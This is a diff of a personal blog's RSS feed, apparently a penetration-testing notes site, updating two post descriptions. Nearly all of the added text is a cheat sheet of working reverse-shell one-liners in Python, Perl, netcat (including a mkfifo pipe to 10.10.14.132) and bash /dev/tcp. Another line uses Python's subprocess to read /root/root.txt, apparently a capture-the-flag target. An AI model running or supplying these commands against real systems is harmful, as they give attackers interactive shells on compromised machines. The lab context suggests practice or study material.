@@ -36,8 +36,7 @@ cat lists |sed &amp;rsquo;s/^.*://&amp;rsquo; &amp;gt; md5 awk -F &amp;ldquo;:&a
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/python/</guid>
-      <description>cat users.txt | python -m json.tool
-python -m SimpleHTTPServer 8000</description>
+      <description>cat users.txt | python -m json.tool python -m SimpleHTTPServer 8000 from subprocess import call call(&#39;cat /root/root.txt  /tmp/output&#39;, shell=True) from subprocess import call call(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;1|nc 10.10.14.132 5555 /tmp/f&#39;, shell=True) </description>
     </item>
     
     <item>
@@ -55,10 +54,10 @@ python -m SimpleHTTPServer 8000</description>
       <pubDate>Mon, 17 Dec 2018 21:17:20 +0100</pubDate>
       
       <guid>https://sosprz.github.io/posts/shell-reverse/</guid>
-      <description>python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
+      <description>connect  python3 -c &amp;lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.10.10.10&amp;rdquo;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;ldquo;/bin/sh&amp;rdquo;,&amp;ldquo;-i&amp;rdquo;]);&amp;rsquo;
 perl -e &amp;lsquo;use Socket;$i=&amp;ldquo;10.10.10.10&amp;rdquo;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;ldquo;tcp&amp;rdquo;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDOUT,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);open(STDERR,&amp;ldquo;&amp;gt;&amp;amp;S&amp;rdquo;);exec(&amp;ldquo;/bin/sh -i&amp;rdquo;);};&amp;rsquo;
 nc -e /bin/sh 10.0.0.1 1234
-
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.132 5555 &amp;gt;/tmp/f 
 reverse  bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.113&amp;frasl;443 0&amp;gt;&amp;amp;1
 &amp;rsquo;/bin/bash -c &amp;lsquo;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.122.1&amp;frasl;2323 0&amp;gt;&amp;amp;1&amp;rsquo; 
 listen  nc -lvp 443
